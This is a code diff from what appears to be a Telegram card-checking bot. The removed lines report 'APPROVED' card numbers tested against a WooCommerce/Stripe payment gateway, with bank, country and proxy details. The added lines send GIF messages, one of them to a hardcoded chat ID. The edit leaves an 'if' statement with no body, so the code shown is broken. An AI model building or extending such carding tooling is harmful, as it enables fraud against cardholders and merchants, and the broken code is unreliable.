@@ -831,65 +831,63 @@ Content-Disposition: form-data; name="variation_id"
 
     # Check if the condition to send the message is True
     if send.get('condition', True):
-        try:
-            # Choose a random reaction from the list
-            random_reaction = random.choice(reactions)
+    try:
+        # Choose a random reaction from the list
+        random_reaction = random.choice(reactions)
 
-            # OtakuGIFs API endpoint to get a random anime GIF with the chosen reaction
-            otaku_gifs_api_url = 'https://api.otakugifs.xyz/gif'
-            otaku_gifs_params = {
-                'reaction': random_reaction,
-                'format': 'gif'
-            }
+        # OtakuGIFs API endpoint to get a random anime GIF with the chosen reaction
+        otaku_gifs_api_url = 'https://api.otakugifs.xyz/gif'
+        otaku_gifs_params = {
+            'reaction': random_reaction,
+            'format': 'gif'
+        }
 
-            # Make a request to the OtakuGIFs API to get a random anime GIF with the chosen reaction
-            response = requests.get(otaku_gifs_api_url, params=otaku_gifs_params)
+        # Make a request to the OtakuGIFs API to get a random anime GIF with the chosen reaction
+        response = requests.get(otaku_gifs_api_url, params=otaku_gifs_params)
 
-            if response.status_code == 200:
-                data = response.json()
-                gif_url = data['url']
+        if response.status_code == 200:
+            data = response.json()
+            gif_url = data['url']
 
-                # Initialize the bot
-                bot = telegram.Bot(token=bot_token)
+            # Initialize the bot
+            bot = telegram.Bot(token=bot_token)
 
-                # Create inline keyboard buttons
-                inline_keyboard = [
-                    [
-                        InlineKeyboardButton("🌸 𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Itz_Shinobu_Kocho"),
-                        InlineKeyboardButton("🔮 𝗟𝗔𝗟𝗔𝗟𝗔𝗟𝗜𝗦𝗔", url="https://t.me/tokpmlist_bot")
-                    ]
+            # Create inline keyboard buttons
+            inline_keyboard = [
+                [
+                    InlineKeyboardButton("🌸 𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Itz_Shinobu_Kocho"),
+                    InlineKeyboardButton("🔮 𝗟𝗔𝗟𝗔𝗟𝗔𝗟𝗜𝗦𝗔", url="https://t.me/tokpmlist_bot")
                 ]
+            ]
 
-                # Create an InlineKeyboardMarkup object
-                reply_markup = InlineKeyboardMarkup(inline_keyboard)
+            # Create an InlineKeyboardMarkup object
+            reply_markup = InlineKeyboardMarkup(inline_keyboard)
 
-                # Send the GIF as an animation (sticker) with the caption and inline keyboard
-                bot.send_animation(
-                    chat_id=chat_id,
-                    animation=gif_url,
-                    caption=f"""**𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗** ✅
-━━━━━━━━━━━━━━━━━━
-💳 **𝗖𝗮𝗿𝗱:** `{ccnd}`
-🚀 **𝗦𝘁𝗮𝘁𝘂𝘀:** {result}
-🌐 **𝗚𝗮𝘁𝗲𝘄𝗮𝘆:** 21.90€ Woo+Stripe 
-━━━━━━━━━━━━━━━━━━
-**𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:**
-  ⩨ **𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:** {vendor_var} - {type_var} - {level_var}
-  ⩨ **𝗕𝗮𝗻𝗸:** {bank_name_var}
-  ⩨ **𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country_var} {flag}
-━━━━━━━━━━━━━━━━━━
-**𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻** ➜ `{formatted_time}`
-**𝗣𝗿𝗼𝘅𝗶𝗲𝘀** ➜ `Off`
-━━━━━━━━━━━━━━━━━━""",
-                    parse_mode=telegram.ParseMode.MARKDOWN,
-                    reply_markup=reply_markup
-                )
-            else:
-                print("Failed to fetch a random anime GIF from OtakuGIFs API.")
-        except Exception as e:
-            print(f"An error occurred: {str(e)}")
+            # Send the first GIF to the specified chat ID (chat_id_1)
+            chat_id_1 = "5911292485"  # Replace with your desired chat ID
+            bot.send_animation(
+                chat_id=chat_id_1,
+                animation=gif_url,
+                caption=f"Your first message caption goes here...",
+                parse_mode=telegram.ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+
+            # Send the second GIF to the chat ID where the bot is used
+            chat_id_2 = message.chat.id  # This will send the message to the chat where the command was used
+            bot.send_animation(
+                chat_id=chat_id_2,
+                animation=gif_url,
+                caption=message.text,  # Use the existing caption from the message
+                parse_mode=telegram.ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+        else:
+            print("Failed to fetch a random anime GIF from OtakuGIFs API.")
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
         pass
-
+        
 if __name__ == '__main__':
     print("Starting bot polling loop...")
     try:
